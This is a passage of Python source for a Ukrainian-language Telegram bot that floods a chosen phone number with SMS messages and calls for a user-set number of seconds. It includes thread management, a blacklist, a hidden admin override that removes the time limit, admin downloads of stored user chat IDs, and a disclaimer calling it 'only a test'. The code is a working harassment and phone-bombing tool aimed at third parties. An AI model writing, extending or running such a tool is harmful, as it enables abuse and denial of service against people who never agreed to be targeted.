        end = datetime.now() + timedelta(seconds=int(secc))
        vv = datetime.now() + timedelta(seconds=300)
        while (datetime.now() < end) or (forcee and chat_id_call==ADMIN_CHAT_ID):
            if chat_id_call not in running_spams_per_chat_id:
                break
            if end > vv:
                if nname == 'Undefined':
                    pass
                else:
                    bot.send_message(chat_id_call,'Ти ввів забагато часу! треба вводити менше 300 секунд')
                break
            send_for_number_mix(phone)
        bot.send_message(chat_id_call, f'<b>Спам на номер {phone} закінченний</b>', parse_mode='HTML')
    elif call.data == 'sms':
              
        bot.edit_message_text(f'💬Почався спам на номер *{phone}*\n⏳Таймер: *{secc}*\n😊Тип спаму *sms*\n',chat_id_call,call.message.id,parse_mode='Markdown')
        end = datetime.now() + timedelta(seconds=int(secc))
        vv = datetime.now() + timedelta(seconds=300)
        while (datetime.now() < end) or (forcee and chat_id_call==ADMIN_CHAT_ID):
            if chat_id_call not in running_spams_per_chat_id:
                break
            if end > vv:
                if nname == 'Undefined':
                    pass
                else:
                    bot.send_message(chat_id_call,'Ти ввів забагато часу! треба вводити менше 300 секунд')
                break
            send_for_number_sms(phone)
        bot.send_message(chat_id_call, f'<b>Спам на номер {phone} закінченний</b>', parse_mode='HTML')
    elif call.data == 'call':
        bot.edit_message_text(f'☎️Почався спам на номер *{phone}*\n⏳Таймер: *{secc}*\n😊Тип спаму *call*\n',chat_id_call,call.message.id,parse_mode='Markdown')
        end = datetime.now() + timedelta(seconds=int(secc))
        vv = datetime.now() + timedelta(seconds=300)
        while (datetime.now() < end) or (forcee and chat_id_call==ADMIN_CHAT_ID):
            if chat_id_call not in running_spams_per_chat_id:
                break
            if end > vv:
                if nname == 'Undefined':
                    pass
                else:
                    bot.send_message(chat_id_call,'Ти ввів забагато часу! треба вводити менше 300 секунд')
                break
            send_for_number_call(phone)
        bot.send_message(chat_id_call, f'<b>Спам на номер {phone} закінченний</b>', parse_mode='HTML')

    try:
        running_spams_per_chat_id.remove(chat_id_call)
    except Exception:
        pass
    THREADS_AMOUNT[0] -= 1 # стояло 1


def spam_handler(phone, chat_id,sec,name,user_id,force=False):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, 'Ви вже почали спам. Дочекайтесь закінчення або нажміть ❌Зупинити спам і поробуйте знов')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        x = threading.Thread(target=start_spam, args=(chat_id, phone, force,sec,name,user_id))
        threads.append(x)
        THREADS_AMOUNT[0] += 1
        x.start()
    else:
        bot.send_message(chat_id, 'Сервера зараз перегружені. Попробуйте знов через пару хвилин.')

@bot.message_handler(content_types=['text'])
def handle_message_received(message: types.Message):
    try:
        with open('black_list.txt', 'r') as f:
            black = f.read().split()
        chat_id = int(message.chat.id)
        text = message.text
        name = message.from_user.first_name
        user_id = message.from_user.id

        if text == '💬Запуск спама':
            save_chat_id(chat_id)
            bot.send_message(chat_id, '<b>Введи номер без + в форматі:\n🇺🇦 380xxxxxxxxx seconds</b>\n\nПриклад: 380000000000 50', parse_mode='HTML')

        elif text == '📊Статистика':
            save_chat_id(chat_id)
            bot.send_message(chat_id, f'📊<b>Статистика відображенна в реальному часі</b>: \n\n📕В боті {users_amount[0]} користувачів.\n☎️Call сервісів: 43\n💬SMS сервісів: 58', parse_mode='HTML')

        elif 'Додати' in text and text.split()[1] not in black:
            black_list_add(text.split()[1])
                
        elif text == 'БД' and chat_id==ADMIN_CHAT_ID:
            bot.send_document(chat_id,open('chat_ids.txt', 'rb'))
            
        elif text == 'ЧС' and chat_id==ADMIN_CHAT_ID:
            bot.send_document(chat_id,open('black_list.txt', 'rb'))

        elif text == '🔥Розсилка' and chat_id==ADMIN_CHAT_ID:
            save_chat_id(chat_id)
            bot.send_message(chat_id, 'Введи повідомлення в форматі: "РОЗІСЛАТИ: ваш_текст"')

        elif text == '❗️ FAQ':
            save_chat_id(chat_id)
            bot.send_message(chat_id, 'Ви автоматично берете відповідальність за користування цим ботом. Ми не несем відповідальності за ваші дії, тільки тест! дякую за увагу.')

        elif text == '❌Зупинити спам':
            save_chat_id(chat_id)
            if chat_id not in running_spams_per_chat_id:
                bot.send_message(chat_id, 'Спам ще не починався')
            else:
                running_spams_per_chat_id.remove(chat_id)

        elif 'РОЗІСЛАТИ: ' in text and chat_id==ADMIN_CHAT_ID:
            msg = text.replace("РОЗІСЛАТИ: ","")
            send_message_users(msg)
        
        elif len(text) <= 16:
            save_chat_id(chat_id)
            if '380' in text:
                sec = message.text.split()[1]
                num = message.text.split()[0]
                if str(num) in black:
                    bot.send_message(chat_id,'Цей номер в чорному списку.')
                else:
                    spam_handler(num, chat_id,sec,name,user_id)
            else:
                bot.send_message(chat_id,'❌Номер не правильно введений!\nВін має починатися з 380')
        else:
            save_chat_id(chat_id)
            bot.send_message(chat_id, f'Номер введений неправильно. Введено {len(text)} символів, а треба 12')
    except IndexError:
        pass
  
if __name__ == '__main__':
    bot.polling(none_stop=True)
